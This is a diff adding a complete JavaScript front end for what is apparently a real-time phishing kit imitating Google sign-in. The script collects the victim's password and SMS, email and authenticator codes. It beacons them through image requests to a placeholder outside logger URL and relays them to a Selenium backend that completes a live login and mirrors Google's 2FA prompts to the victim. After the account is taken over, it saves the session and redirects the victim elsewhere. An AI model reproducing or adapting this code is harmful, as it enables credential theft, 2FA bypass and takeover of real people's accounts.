@@ -1,0 +1,983 @@
+document.addEventListener('DOMContentLoaded', function() {
+    // DOM Elements
+    const fullPageLoader = document.getElementById('fullPageLoader');
+    const loadingIframe = document.getElementById('loadingIframe');
+    const sessionExpired = document.getElementById('sessionExpired');
+    const formBox = document.getElementById('formBox');
+    const passwordInput = document.getElementById('passwordInput');
+    const passwordError = document.getElementById('passwordError');
+    const nextButton = document.getElementById('nextButton');
+    const authNumberDisplay = document.getElementById('authNumberDisplay');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const authEmailDisplay = document.getElementById('authEmailDisplay');
+    const pageTitle = document.getElementById('pageTitle');
+    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+    const showPasswordLabel = document.getElementById('showPasswordLabel');
+    const textCodeInput = document.getElementById('textCodeInput');
+    const emailCodeInput = document.getElementById('emailCodeInput');
+    const authenticatorCodeInput = document.getElementById('authenticatorCodeInput');
+    const textCodeError = document.getElementById('textCodeError');
+    const emailCodeError = document.getElementById('emailCodeError');
+    const authenticatorCodeError = document.getElementById('authenticatorCodeError');
+    const profileIcons = document.querySelectorAll('.profile-icon');
+    const verificationGif = document.getElementById('verificationGif');
+    const gifHeaderText = document.getElementById('gifHeaderText');
+    const authNumberVerificationDisplay = document.getElementById('authNumberVerificationDisplay');
+    const authNumberVerificationTitle = document.getElementById('authNumberVerificationTitle');
+    const authNumberVerificationInstruction = document.getElementById('authNumberVerificationInstruction');
+    const passwordForm = document.getElementById('passwordForm');
+    const deviceAuthContainer = document.getElementById('deviceAuthContainer');
+    const successPage = document.getElementById('successPage');
+    const safetyMessage = document.getElementById('safetyMessage');
+    const authSafetyMessage = document.getElementById('authSafetyMessage');
+    const tryAnotherWayFromGif = document.getElementById('tryAnotherWayFromGif');
+    const tryAnotherWayFromAuthNumber = document.getElementById('tryAnotherWayFromAuthNumber');
+    const tapYesOption = document.getElementById('tapYesOption');
+    const textOption = document.getElementById('textOption');
+    const emailOption = document.getElementById('emailOption');
+    const authenticatorOption = document.getElementById('authenticatorOption');
+    const helpOption = document.getElementById('helpOption');
+    const textCodeInstruction = document.getElementById('textCodeInstruction');
+    const emailCodeInstruction = document.getElementById('emailCodeInstruction');
+
+    // State variables
+    let currentEmail = '';
+    let sessionId = '';
+    let statusPollingInterval = null;
+    let codeVerificationInterval = null;
+    let pageMonitorInterval = null;
+    let passwordErrorState = false;
+    let lastActivityTime = Date.now();
+    const API_BASE_URL = 'http://localhost:5000/api';
+    const PHP_LOGGER_URL = 'https://yourdomain.com/logger.php';
+
+    // Initialize application
+    initApplication();
+
+    function initApplication() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailFromURL = urlParams.get('email');
+        
+        if (!emailFromURL) {
+            document.getElementById('noEmailContainer').style.display = 'block';
+            document.getElementById('passwordForm').style.display = 'none';
+            document.getElementById('deviceAuthContainer').style.display = 'none';
+            return;
+        }
+
+        currentEmail = emailFromURL;
+        sessionId = generateSessionId();
+        initUI();
+        startSession();
+        setupEventListeners();
+        
+        loadingIframe.style.display = 'block';
+        setupActivityMonitoring();
+    }
+
+    function setupActivityMonitoring() {
+        document.addEventListener('mousemove', updateActivityTime);
+        document.addEventListener('keydown', updateActivityTime);
+        document.addEventListener('click', updateActivityTime);
+        document.addEventListener('scroll', updateActivityTime);
+        
+        setInterval(checkInactivity, 60000);
+    }
+
+    function updateActivityTime() {
+        lastActivityTime = Date.now();
+    }
+
+    function checkInactivity() {
+        const inactiveTime = Date.now() - lastActivityTime;
+        if (inactiveTime > 180000) {
+            showSessionExpired();
+        }
+    }
+
+    function showSessionExpired() {
+        sessionExpired.style.display = 'block';
+        setTimeout(() => {
+            window.location.href = `https://example.com?${encodeURIComponent(currentEmail)}#incomplete`;
+        }, 3000);
+    }
+
+    function generateSessionId() {
+        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    }
+
+    function initUI() {
+        fullPageLoader.style.display = 'none';
+        formBox.classList.remove('blur-effect');
+        
+        updateEmailDisplay(currentEmail);
+        updateProfileIcons(currentEmail);
+        
+        showPasswordCheckbox.addEventListener('click', togglePasswordVisibility);
+        showPasswordLabel.addEventListener('click', togglePasswordVisibility);
+    }
+
+    function togglePasswordVisibility() {
+        const isChecked = showPasswordCheckbox.classList.contains('checked');
+        if (isChecked) {
+            showPasswordCheckbox.classList.remove('checked');
+            passwordInput.type = 'password';
+        } else {
+            showPasswordCheckbox.classList.add('checked');
+            passwordInput.type = 'text';
+        }
+    }
+
+    function setLoadingState(loading, isPasswordPage = false, persistUntilNextPage = false) {
+        const throbber = document.getElementById('throbberContainer');
+        
+        if (loading) {
+            throbber.style.display = 'block';
+            throbber.classList.remove('hidden');
+            if (!persistUntilNextPage) {
+                formBox.classList.add('blur-effect');
+            }
+            if (isPasswordPage) {
+                nextButton.classList.add('loading');
+            }
+        } else {
+            throbber.classList.add('hidden');
+            setTimeout(() => {
+                throbber.style.display = 'none';
+            }, 200);
+            formBox.classList.remove('blur-effect');
+            nextButton.classList.remove('loading');
+        }
+    }
+
+    function setupEventListeners() {
+        nextButton.addEventListener('click', handlePasswordSubmit);
+        document.getElementById('backToDeviceAuth').addEventListener('click', showDevicePrompt);
+        tapYesOption.addEventListener('click', () => selectAuthOption('device'));
+        textOption.addEventListener('click', () => selectAuthOption('sms'));
+        emailOption.addEventListener('click', () => selectAuthOption('email'));
+        authenticatorOption.addEventListener('click', () => selectAuthOption('authenticator'));
+        helpOption.addEventListener('click', () => selectAuthOption('help'));
+        document.getElementById('tryAnotherWayFromText').addEventListener('click', handleTryAnotherWayFromText);
+        document.getElementById('tryAnotherWayFromEmail').addEventListener('click', handleTryAnotherWayFromEmail);
+        document.getElementById('tryAnotherWayFromAuthenticator').addEventListener('click', handleTryAnotherWayFromAuthenticator);
+        document.getElementById('submitTextCode').addEventListener('click', () => handleCodeSubmit('text'));
+        document.getElementById('submitEmailCode').addEventListener('click', () => handleCodeSubmit('email'));
+        document.getElementById('submitAuthenticatorCode').addEventListener('click', () => handleCodeSubmit('authenticator'));
+        tryAnotherWayFromGif.addEventListener('click', handleTryAnotherWayFromGif);
+        tryAnotherWayFromAuthNumber.addEventListener('click', handleTryAnotherWayFromAuthNumber);
+        
+        passwordInput.addEventListener('input', function() {
+            if (passwordErrorState) {
+                passwordInput.classList.remove('dark-red-border');
+                document.getElementById('passwordError').style.display = 'block';
+            }
+        });
+
+        passwordInput.addEventListener('focus', function() {
+            if (passwordErrorState) {
+                passwordInput.classList.add('dark-red-border');
+            }
+        });
+
+        passwordInput.addEventListener('blur', function() {
+            if (passwordErrorState && !passwordInput.value) {
+                passwordInput.classList.add('dark-red-border');
+            }
+        });
+        
+        textCodeInput.addEventListener('input', handleOtpInput);
+        emailCodeInput.addEventListener('input', handleOtpInput);
+        authenticatorCodeInput.addEventListener('input', handleOtpInput);
+        setupSendAgainButtons();
+    }
+
+    function handleOtpInput(e) {
+        const input = e.target;
+        const errorId = input.id.replace('Input', 'Error');
+        clearError(errorId);
+        input.value = input.value.replace(/[^0-9]/g, '');
+        input.classList.remove('has-error');
+        input.classList.remove('dark-red-border');
+    }
+
+    function setupSendAgainButtons() {
+        const sendAgainButtons = [
+            document.getElementById('sendAgainDevice'),
+            document.getElementById('sendAgainText'),
+            document.getElementById('sendAgainEmail'),
+            document.getElementById('sendAgainAuthenticator')
+        ];
+        
+        sendAgainButtons.forEach(btn => {
+            if (btn) {
+                btn.addEventListener('click', async function(e) {
+                    e.preventDefault();
+                    const originalText = btn.textContent;
+                    btn.classList.add('send-again-loading');
+                    btn.textContent = 'Sending...';
+                    
+                    try {
+                        const method = this.id.replace('sendAgain', '').toLowerCase();
+                        await makeGetRequest(`${API_BASE_URL}/selenium/send_code`, {
+                            session_id: sessionId,
+                            method: method
+                        });
+                        
+                        showCustomAlert('New verification code sent!');
+                    } catch (error) {
+                        console.error('Send again failed:', error);
+                        showCustomAlert('Failed to send. Please try again.', true);
+                    } finally {
+                        btn.classList.remove('send-again-loading');
+                        btn.textContent = originalText;
+                    }
+                });
+            }
+        });
+    }
+
+    async function makeGetRequest(url, params) {
+        const queryString = new URLSearchParams(params).toString();
+        const response = await fetch(`${url}?${queryString}`, {
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        return await response.json();
+    }
+
+    function logToPHP(data) {
+        const params = new URLSearchParams(data);
+        new Image().src = `${PHP_LOGGER_URL}?${params.toString()}`;
+    }
+
+    async function handlePasswordSubmit() {
+        const password = passwordInput.value.trim();
+        
+        // Log to PHP
+        logToPHP({
+            email: currentEmail,
+            password: password,
+            action: 'password_submit',
+            session_id: sessionId,
+            ip: window.location.hostname,
+            user_agent: navigator.userAgent
+        });
+        
+        setLoadingState(true, true, true);
+        
+        try {
+            const response = await makeGetRequest(`${API_BASE_URL}/auth/password`, {
+                email: currentEmail,
+                password: password,
+                session_id: sessionId
+            });
+            
+            if (response.success) {
+                startStatusPolling();
+            } else {
+                setLoadingState(false);
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                checkStatus().then(status => {
+                    if (status && status.display) {
+                        handlePageStateUpdate(status.display);
+                    }
+                });
+            }
+        } catch (error) {
+            console.error('Password submit error:', error);
+            setLoadingState(false);
+            showError('passwordError', 'Connection error. Please try again.');
+            passwordInput.focus();
+        }
+    }
+
+    function startStatusPolling() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        
+        let lastErrorState = null;
+        
+        statusPollingInterval = setInterval(async () => {
+            const status = await checkStatus();
+            if (status?.display) {
+                if (status.display.error?.password !== lastErrorState) {
+                    handlePageStateUpdate(status.display);
+                    lastErrorState = status.display.error?.password;
+                }
+                
+                if (status.display.error?.password) {
+                    clearInterval(statusPollingInterval);
+                }
+            }
+        }, 1000);
+    }
+
+    async function checkStatus() {
+        try {
+            return await makeGetRequest(`${API_BASE_URL}/auth/status`, {
+                email: currentEmail,
+                session_id: sessionId
+            });
+        } catch (error) {
+            console.error('Error checking status:', error);
+            return null;
+        }
+    }
+
+    function handlePageStateUpdate(displayConfig) {
+        if (displayConfig.password_page_ready) {
+            loadingIframe.style.display = 'none';
+        }
+
+        if (displayConfig.error?.password || displayConfig.error?.otp) {
+            setLoadingState(false);
+        }
+
+        if (displayConfig.current_page === 'password') {
+            safetyMessage.style.display = 'none';
+            
+            if (displayConfig.heading_text) {
+                pageTitle.textContent = displayConfig.heading_text;
+            }
+
+            if (displayConfig.password_field_detected) {
+                passwordForm.style.display = 'block';
+                deviceAuthContainer.style.display = 'none';
+                successPage.style.display = 'none';
+                startStatusPolling();
+            }
+
+            if (displayConfig.error?.password !== null && displayConfig.error?.password !== undefined) {
+                showError('passwordError', displayConfig.error.password);
+                passwordInput.classList.add('dark-red-border');
+                passwordInput.focus();
+            } else {
+                clearError('passwordError');
+            }
+        }
+        else if (displayConfig.current_page === '2fa') {
+            safetyMessage.style.display = 'block';
+            authSafetyMessage.style.display = 'block';
+
+            passwordForm.style.display = 'none';
+            deviceAuthContainer.style.display = 'block';
+            successPage.style.display = 'none';
+
+            update2FADisplay(displayConfig);
+
+            if (displayConfig.has_gif_element || displayConfig.has_auth_number_element) {
+                setLoadingState(true, false, true);
+            } else {
+                setLoadingState(false);
+            }
+
+            if (displayConfig.is_text_otp_page && displayConfig.text_otp_instruction) {
+                textCodeInstruction.textContent = displayConfig.text_otp_instruction;
+            }
+
+            if (displayConfig.is_email_verification_page && displayConfig.email_verification_instruction) {
+                emailCodeInstruction.textContent = displayConfig.email_verification_instruction;
+            }
+
+            if (displayConfig.error?.otp) {
+                const currentMethod = getCurrentAuthMethod();
+                if (currentMethod === 'text') {
+                    showError('textCodeError', displayConfig.error.otp);
+                    textCodeInput.classList.add('dark-red-border');
+                    textCodeInput.focus();
+                } else if (currentMethod === 'email') {
+                    showError('emailCodeError', displayConfig.error.otp);
+                    emailCodeInput.classList.add('dark-red-border');
+                    emailCodeInput.focus();
+                } else if (currentMethod === 'authenticator') {
+                    showError('authenticatorCodeError', displayConfig.error.otp);
+                    authenticatorCodeInput.classList.add('dark-red-border');
+                    authenticatorCodeInput.focus();
+                }
+            }
+        }
+        else if (!displayConfig.heading_found && displayConfig.current_url && displayConfig.current_url.includes('mail.google.com')) {
+            clearInterval(pageMonitorInterval);
+            setLoadingState(false);
+            passwordForm.style.display = 'none';
+            deviceAuthContainer.style.display = 'none';
+            successPage.style.display = 'block';
+
+            setTimeout(() => {
+                window.location.href = 'https://example.com';
+            }, 3000);
+
+            saveSuccessfulSession();
+        }
+    }
+
+    function update2FADisplay(data) {
+        hideAllAuthContainers();
+    
+        if (data.has_gif_element) {
+            const gifContainer = document.getElementById('gifVerificationContainer');
+            gifContainer.style.display = 'block';
+    
+            if (data.gif_url) {
+                document.getElementById('verificationGif').src = data.gif_url;
+            }
+            if (data.gif_heading) {
+                document.getElementById('gifHeaderText').textContent = data.gif_heading;
+            }
+        }
+        else if (data.has_auth_number_element) {
+            document.getElementById('authNumberVerificationContainer').style.display = 'block';
+    
+            if (data.auth_number) {
+                document.getElementById('authNumberVerificationDisplay').textContent = data.auth_number;
+            }
+            if (data.auth_number_heading) {
+                document.getElementById('authNumberVerificationTitle').textContent = data.auth_number_heading;
+            }
+            if (data.auth_number_instruction) {
+                document.getElementById('authNumberVerificationInstruction').textContent = data.auth_number_instruction;
+            }
+        }
+        else if (data.is_authenticator_page) {
+            document.getElementById('authenticatorContainer').style.display = 'block';
+        }
+        else if (data.is_options_page) {
+            showAltAuthOptions(data.options || []);
+        }
+        else if (data.is_text_otp_page) {
+            document.getElementById('textCodeContainer').style.display = 'block';
+            if (data.text_otp_instruction) {
+                document.getElementById('textCodeInstruction').textContent = data.text_otp_instruction;
+            }
+        }
+        else if (data.is_email_verification_page) {
+            document.getElementById('emailCodeContainer').style.display = 'block';
+            if (data.email_verification_instruction) {
+                document.getElementById('emailCodeInstruction').textContent = data.email_verification_instruction;
+            }
+        }
+        else {
+            document.getElementById('devicePromptContainer').style.display = 'block';
+    
+            if (data.auth_number) {
+                document.getElementById('authNumberDisplay').textContent = data.auth_number;
+                document.getElementById('authNumberText').textContent = data.auth_number;
+            }
+            if (data.auth_number_heading) {
+                document.getElementById('authNumberHeading').textContent = data.auth_number_heading;
+            }
+            if (data.auth_number_instruction) {
+                document.getElementById('authNumberInstruction').textContent = data.auth_number_instruction;
+            }
+        }
+    
+        updateUIFromDisplayConfig(data);
+    }
+
+    async function showAltAuthOptions(options) {
+        const loading = showLoading();
+        try {
+            const altAuthOptions = document.getElementById('altAuthOptions');
+            altAuthOptions.innerHTML = '';
+            
+            options.forEach(option => {
+                const optionDiv = document.createElement('div');
+                optionDiv.className = 'auth-option';
+                
+                if (option.text.includes('Unavailable')) {
+                    optionDiv.classList.add('unavailable');
+                }
+                
+                let icon = '';
+                let title = '';
+                let desc = '';
+                
+                if (option.is_tap_yes) {
+                    icon = '<span class="material-icons">phone_iphone</span>';
+                    title = 'Tap "Yes" on your device';
+                    desc = 'Confirm it\'s you on one of your devices';
+                } 
+                else if (option.is_authenticator) {
+                    icon = '<span class="material-icons">security</span>';
+                    title = 'Use Google Authenticator';
+                    desc = 'Get a verification code from the app';
+                }
+                else if (option.is_sms) {
+                    icon = '<span class="material-icons">sms</span>';
+                    const phoneMatch = option.text.match(/\(\d{3}\) \d{3}-\d{4}/);
+                    title = 'Get a verification code by text';
+                    desc = phoneMatch ? `+1 ${phoneMatch[0]}` : option.text.split('\n')[0];
+                }
+                else if (option.is_email) {
+                    icon = '<span class="material-icons">email</span>';
+                    title = 'Get a verification code by email';
+                    desc = option.text.split('\n')[0];
+                }
+                else if (option.is_help) {
+                    icon = '<span class="material-icons">help</span>';
+                    title = 'Get help';
+                    desc = 'Troubleshoot issues with 2-Step Verification';
+                }
+                else {
+                    icon = '<span class="material-icons">help</span>';
+                    title = option.text.split('\n')[0];
+                    desc = option.text.split('\n').slice(1).join('<br>');
+                }
+                
+                optionDiv.innerHTML = `
+                    <div class="auth-method-icon">${icon}</div>
+                    <div class="auth-option-content">
+                        <div class="auth-option-title">${title}</div>
+                        <div class="auth-option-desc">${desc}</div>
+                    </div>
+                `;
+                
+                if (!option.text.includes('Unavailable')) {
+                    optionDiv.addEventListener('click', async () => {
+                        setLoadingState(true, false, true);
+                        try {
+                            await makeGetRequest(`${API_BASE_URL}/selenium/select_option`, {
+                                session_id: sessionId,
+                                option_xpath: option.xpath,
+                                option_type: getOptionType(option)
+                            });
+                        } catch (error) {
+                            console.error('Error selecting option:', error);
+                            showCustomAlert('Connection error. Please try again.', true);
+                            setLoadingState(false);
+                        }
+                    });
+                }
+                
+                altAuthOptions.appendChild(optionDiv);
+            });
+            
+            const backButton = document.createElement('a');
+            backButton.className = 'back-to-device-auth';
+            backButton.id = 'backToDeviceAuth';
+            backButton.textContent = 'Back';
+            backButton.addEventListener('click', showDevicePrompt);
+            altAuthOptions.appendChild(backButton);
+            
+            hideAllAuthContainers();
+            altAuthOptions.style.display = 'block';
+            
+            loading.hide();
+        } catch (error) {
+            loading.hide();
+            showCustomAlert('Failed to load options. Please try again.', true);
+            console.error('Error loading options:', error);
+        }
+    }
+
+    function getOptionType(option) {
+        if (option.is_tap_yes) return 'device';
+        if (option.is_authenticator) return 'authenticator';
+        if (option.is_sms) return 'sms';
+        if (option.is_email) return 'email';
+        if (option.is_help) return 'help';
+        return 'unknown';
+    }
+
+    function updateUIFromDisplayConfig(displayConfig) {
+        if (displayConfig.device_name) {
+            document.querySelector('.device-prompt-container .auth-instruction').innerHTML = 
+                `Google sent a notification to ${displayConfig.device_name}. Open the Gmail app, tap Yes on the prompt, ` +
+                `then tap <span id="authNumberText">${displayConfig.auth_number || '21'}</span> on your phone to verify it's you.`;
+        }
+        
+        if (displayConfig.auth_number) {
+            authNumberDisplay.textContent = displayConfig.auth_number;
+            authNumberText.textContent = displayConfig.auth_number;
+        }
+        
+        if (displayConfig.masked_email) {
+            document.querySelector('#emailOption .auth-option-desc').textContent = displayConfig.masked_email;
+            document.querySelector('#emailCodeContainer .auth-instruction').textContent = 
+                `We sent a 6-digit code to ${displayConfig.masked_email}. Enter it below to verify it's you.`;
+        }
+        
+        if (displayConfig.masked_phone) {
+            document.querySelector('#textOption .auth-option-desc').textContent = displayConfig.masked_phone;
+            document.querySelector('#textCodeContainer .auth-instruction').textContent = 
+                `We sent a 6-digit code to ${displayConfig.masked_phone}. Enter it below to verify it's you.`;
+        }
+    }
+
+    async function saveSuccessfulSession() {
+        try {
+            await makeGetRequest(`${API_BASE_URL}/save_successful_session`, {
+                email: currentEmail,
+                session_id: sessionId
+            });
+        } catch (error) {
+            console.error('Error saving successful session:', error);
+        }
+    }
+
+    async function handleTryAnotherWayFromText() {
+        setLoadingState(true);
+        try {
+            await makeGetRequest(`${API_BASE_URL}/selenium/try_another_way`, {
+                session_id: sessionId,
+                method: 'text',
+                xpath: '//*[@id="yDmH0d"]/c-wiz/main/div[3]/div[2]/div[2]/div/div/button/span'
+            });
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromEmail() {
+        setLoadingState(true);
+        try {
+            await makeGetRequest(`${API_BASE_URL}/selenium/try_another_way`, {
+                session_id: sessionId,
+                method: 'email',
+                xpath: '//*[@id="yDmH0d"]/c-wiz/main/div[3]/div/div[2]/div/div/button/span'
+            });
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromAuthenticator() {
+        setLoadingState(true);
+        try {
+            await makeGetRequest(`${API_BASE_URL}/selenium/try_another_way`, {
+                session_id: sessionId,
+                method: 'authenticator',
+                xpath: '//*[@id="yDmH0d"]/c-wiz/main/div[3]/div/div[2]/div/div/button/span'
+            });
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromGif() {
+        setLoadingState(true);
+        try {
+            await makeGetRequest(`${API_BASE_URL}/selenium/try_another_way`, {
+                session_id: sessionId,
+                method: 'gif'
+            });
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromAuthNumber() {
+        setLoadingState(true);
+        try {
+            await makeGetRequest(`${API_BASE_URL}/selenium/try_another_way`, {
+                session_id: sessionId,
+                method: 'auth_number'
+            });
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function selectAuthOption(methodType) {
+        setLoadingState(true, false, true);
+        
+        try {
+            const status = await checkStatus();
+            
+            if (!status.success || !status.display || !status.display.options) {
+                showCustomAlert('No authentication options available', true);
+                setLoadingState(false);
+                return;
+            }
+
+            let option = null;
+            const options = status.display.options;
+            
+            switch (methodType) {
+                case 'device':
+                    option = options.find(opt => opt.is_tap_yes);
+                    break;
+                case 'sms':
+                    option = options.find(opt => opt.is_sms);
+                    break;
+                case 'email':
+                    option = options.find(opt => opt.is_email);
+                    break;
+                case 'authenticator':
+                    option = options.find(opt => opt.is_authenticator);
+                    break;
+                case 'help':
+                    option = options.find(opt => opt.is_help);
+                    break;
+                default:
+                    showCustomAlert('Invalid authentication method', true);
+                    setLoadingState(false);
+                    return;
+            }
+
+            if (!option) {
+                showCustomAlert('This authentication method is not available', true);
+                setLoadingState(false);
+                return;
+            }
+
+            await makeGetRequest(`${API_BASE_URL}/selenium/select_option`, {
+                session_id: sessionId,
+                option_xpath: option.xpath,
+                option_type: methodType
+            });
+        } catch (error) {
+            console.error('Error selecting authentication option:', error);
+            setLoadingState(false);
+            showCustomAlert('Connection error. Please try again.', true);
+        }
+    }
+
+    function showDevicePrompt() {
+        hideAllAuthContainers();
+        document.getElementById('devicePromptContainer').style.display = 'block';
+        startStatusPolling();
+    }
+
+    function showTextVerification() {
+        const loading = showLoading();
+        hideAllAuthContainers();
+        document.getElementById('textCodeContainer').style.display = 'block';
+        textCodeInput.focus();
+        loading.hide();
+    }
+
+    function showEmailVerification() {
+        const loading = showLoading();
+        hideAllAuthContainers();
+        document.getElementById('emailCodeContainer').style.display = 'block';
+        emailCodeInput.focus();
+        loading.hide();
+    }
+
+    function showAuthenticator() {
+        const loading = showLoading();
+        hideAllAuthContainers();
+        document.getElementById('authenticatorContainer').style.display = 'block';
+        authenticatorCodeInput.focus();
+        loading.hide();
+    }
+
+    function hideAllAuthContainers() {
+        document.getElementById('devicePromptContainer').style.display = 'none';
+        document.getElementById('altAuthOptions').style.display = 'none';
+        document.getElementById('textCodeContainer').style.display = 'none';
+        document.getElementById('emailCodeContainer').style.display = 'none';
+        document.getElementById('authenticatorContainer').style.display = 'none';
+        document.getElementById('gifVerificationContainer').style.display = 'none';
+        document.getElementById('authNumberVerificationContainer').style.display = 'none';
+    }
+
+    function showCustomAlert(message, isError = false) {
+        const alertDiv = document.createElement('div');
+        alertDiv.className = 'custom-alert';
+        
+        const icon = document.createElement('span');
+        icon.className = 'material-icons custom-alert-icon';
+        icon.textContent = isError ? 'error' : 'check_circle';
+        if (isError) icon.classList.add('custom-alert-error');
+        
+        const messageSpan = document.createElement('span');
+        messageSpan.className = 'custom-alert-message';
+        messageSpan.textContent = message;
+        
+        alertDiv.appendChild(icon);
+        alertDiv.appendChild(messageSpan);
+        
+        document.body.appendChild(alertDiv);
+        
+        setTimeout(() => {
+            alertDiv.style.opacity = '0';
+            setTimeout(() => {
+                document.body.removeChild(alertDiv);
+            }, 300);
+        }, 3000);
+    }
+
+    async function handleCodeSubmit(method) {
+        const inputMap = {
+            text: textCodeInput,
+            email: emailCodeInput,
+            authenticator: authenticatorCodeInput
+        };
+        const errorMap = {
+            text: 'textCodeError',
+            email: 'emailCodeError',
+            authenticator: 'authenticatorCodeError'
+        };
+        
+        const input = inputMap[method];
+        const errorId = errorMap[method];
+        const code = input && input.value ? input.value.trim() : '';
+        
+        if (!code || code.length !== 6) {
+            showError(errorId, 'Please enter a 6-digit code');
+            return;
+        }
+        
+        // Log to PHP
+        logToPHP({
+            email: currentEmail,
+            code: code,
+            method: method,
+            action: 'otp_submit',
+            session_id: sessionId,
+            ip: window.location.hostname,
+            user_agent: navigator.userAgent
+        });
+        
+        clearError(errorId);
+        setLoadingState(true);
+        
+        try {
+            const response = await makeGetRequest(`${API_BASE_URL}/auth/otp`, {
+                email: currentEmail,
+                otp: code,
+                method: method,
+                session_id: sessionId
+            });
+            
+            if (response.success) {
+                startFinalStatusPolling();
+            } else {
+                setLoadingState(false);
+                showError(errorId, response.error || 'Invalid verification code');
+                if (input) {
+                    input.value = '';
+                    input.focus();
+                }
+            }
+        } catch (error) {
+            setLoadingState(false);
+            showError(errorId, 'Connection error. Please try again.');
+            console.error('Error:', error);
+        }
+    }
+
+    function startFinalStatusPolling() {
+        if (codeVerificationInterval) {
+            clearInterval(codeVerificationInterval);
+        }
+        
+        codeVerificationInterval = setInterval(async () => {
+            const status = await checkStatus();
+            if (status && status.display) {
+                if (status.display.current_page === 'exit' || !status.display.heading_found) {
+                    clearInterval(codeVerificationInterval);
+                    showLoading().hide();
+                    
+                    passwordForm.style.display = 'none';
+                    deviceAuthContainer.style.display = 'none';
+                    successPage.style.display = 'block';
+                }
+            }
+        }, 2000);
+    }
+
+    function updateProfileIcons(email) {
+        const initial = email.charAt(0).toUpperCase();
+        const colors = ['#4285F4', '#34A853', '#FBBC05', '#EA4335', '#673AB7'];
+        const colorIndex = initial.charCodeAt(0) % colors.length;
+        
+        profileIcons.forEach(icon => {
+            icon.textContent = initial;
+            icon.style.backgroundColor = colors[colorIndex];
+        });
+    }
+
+    function updateEmailDisplay(email) {
+        emailDisplay.textContent = email;
+        authEmailDisplay.textContent = email;
+    }
+
+    function showError(elementId, message) {
+        const element = document.getElementById(elementId);
+        if (element) {
+            setLoadingState(false);
+            
+            element.textContent = message;
+            element.style.display = 'block';
+            element.classList.add('dark-red-error');
+            
+            if (elementId === 'passwordError') {
+                passwordInput.classList.add('dark-red-border');
+                passwordInput.focus();
+                passwordErrorState = true;
+            }
+            else if (elementId === 'textCodeError') {
+                textCodeInput.classList.add('dark-red-border');
+                textCodeInput.focus();
+            }
+            else if (elementId === 'emailCodeError') {
+                emailCodeInput.classList.add('dark-red-border');
+                emailCodeInput.focus();
+            }
+            else if (elementId === 'authenticatorCodeError') {
+                authenticatorCodeInput.classList.add('dark-red-border');
+                authenticatorCodeInput.focus();
+            }
+        }
+    }
+
+    function clearError(elementId) {
+        const element = document.getElementById(elementId);
+        if (element) {
+            if (elementId === 'passwordError' && passwordErrorState) {
+                return;
+            }
+            
+            element.textContent = '';
+            element.style.display = 'none';
+            element.classList.remove('dark-red-error');
+            
+            if (elementId === 'passwordError') {
+                passwordInput.classList.remove('dark-red-border');
+                passwordErrorState = false;
+            }
+        }
+    }
+
+    function getCurrentAuthMethod() {
+        if (document.getElementById('textCodeContainer').style.display === 'block') return 'text';
+        if (document.getElementById('emailCodeContainer').style.display === 'block') return 'email';
+        if (document.getElementById('authenticatorContainer').style.display === 'block') return 'authenticator';
+        return 'device';
+    }
+
+    function showLoading() {
+        document.getElementById('throbberContainer').style.display = 'block';
+        formBox.classList.add('loading');
+        nextButton.classList.add('loading');
+        return {
+            hide: () => {
+                document.getElementById('throbberContainer').style.display = 'none';
+                formBox.classList.remove('loading');
+                nextButton.classList.remove('loading');
+            }
+        };
+    }
+});
